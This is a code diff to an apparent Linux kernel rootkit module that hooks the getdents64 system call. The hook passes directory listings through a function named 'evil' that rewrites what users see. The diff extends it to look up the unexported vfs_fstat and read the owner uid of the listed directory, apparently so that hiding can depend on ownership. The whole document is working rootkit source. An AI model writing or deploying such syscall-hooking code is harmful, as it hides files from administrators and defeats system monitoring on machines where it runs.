@@ -23,7 +23,7 @@ struct linux_dirent {
 */
 
 
-int evil(struct linux_dirent __user * dirent, int res) {    
+int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {    
     int err;
 	unsigned long off = 0;
 	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
@@ -39,6 +39,21 @@ int evil(struct linux_dirent __user * dirent, int res) {
         printk(KERN_DEBUG "can not copy from user!\n");
 		goto out;
     }
+
+    int (*vfs_fstat)(int, struct kstat *) = lookup_name("vfs_fstat");
+    printk(KERN_DEBUG "vfs_fstat is at %lx\n", vfs_fstat);
+
+    struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
+    kuid_t user;
+    err = vfs_fstat(fd, stat);
+    if (err){
+        printk(KERN_DEBUG "can not read file attributes!\n");
+		goto out;
+    }
+    user = stat->uid;
+    kfree(stat);
+
+    printk(KERN_DEBUG "file belongs to %i!\n", user);
 
 	while (off < res) {
 		dir = (void *)kdirent + off;
@@ -67,18 +82,18 @@ static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs*);
 
 static asmlinkage int hook_sys_getdents64(const struct pt_regs* regs) {
     struct linux_dirent __user *dirent = SECOND_ARG(regs, struct linux_dirent __user *);
+    unsigned int fd = FIRST_ARG(regs, unsigned int);
     int res;
     
     res = orig_sys_getdents64(regs);
 
-    printk(KERN_DEBUG "orig_sys_getdents64 done\n");
 
     if (res <= 0){
         // The original getdents failed - we aint mangling with that.
 		return res;
     }
 
-    res = evil(dirent, res);
+    res = evil(dirent, res, fd);
     
     return res;
 }
@@ -90,14 +105,13 @@ static asmlinkage int hook_sys_getdents64(unsigned int fd, struct linux_dirent _
     
     res = orig_sys_getdents64(regs);
 
-    printk(KERN_DEBUG "orig_sys_getdents64 done\n");
 
     if (res <= 0){
         // The original getdents failed - we aint mangling with that.
 		return res;
     }
 
-    res = evil(dirent, res);
+    res = evil(dirent, res, fd);
     
     return res;
 }
